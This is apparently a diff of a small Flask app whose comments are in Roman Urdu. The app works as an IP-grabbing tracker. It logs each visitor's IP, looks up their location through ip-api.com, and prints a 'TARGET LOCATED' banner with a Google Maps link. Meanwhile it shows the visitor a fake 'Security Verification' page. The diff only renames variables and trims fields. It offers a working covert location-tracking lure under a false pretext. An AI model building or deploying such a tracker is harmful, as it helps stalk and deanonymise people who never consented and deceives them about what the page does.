@@ -5,29 +5,24 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    # Target ka IP nikalna
-    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
+    # User ka asli IP nikalne ke liye ye line lazmi hai
+    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
     
     try:
-        # Aik reliable service jo Karachi ka data degi
-        response = requests.get(f'http://ip-api.com/json/{ip}').json()
-        lat = response.get('lat')
-        lon = response.get('lon')
-        city = response.get('city', 'Karachi') # Default Karachi agar API slow ho
-        isp = response.get('isp', 'Local ISP')
+        # User ke IP se data nikalna
+        res = requests.get(f'http://ip-api.com/json/{user_ip}').json()
+        lat = res.get('lat')
+        lon = res.get('lon')
+        city = res.get('city', 'Unknown')
         
-        # Asli Google Map link jo coordinates use kare
-        if lat and lon:
-            map_link = f"https://www.google.com/maps?q={lat},{lon}"
-        else:
-            map_link = "Coordinates fetching..."
+        # Exact Google Map link jo coordinates use kare
+        map_link = f"https://www.google.com/maps?q={lat},{lon}" if lat else "Not Found"
             
-    except Exception as e:
-        city = "Karachi (Manual)"
-        map_link = "Check Logs Again"
+    except:
+        city, map_link = "Error", "Error"
 
     print(f"\n--- [!!!] TARGET LOCATED [!!!] ---")
-    print(f"IP: {ip} | City: {city} | ISP: {isp}")
+    print(f"IP: {user_ip} | City: {city}")
     print(f"Exact Map: {map_link}\n")
     
-    return "<h2>Security Verification...</h2><p>Stability check complete. Please wait for redirect.</p>"
+    return "<h2>Security Verification...</h2><p>Connection stable. Please wait.</p>"
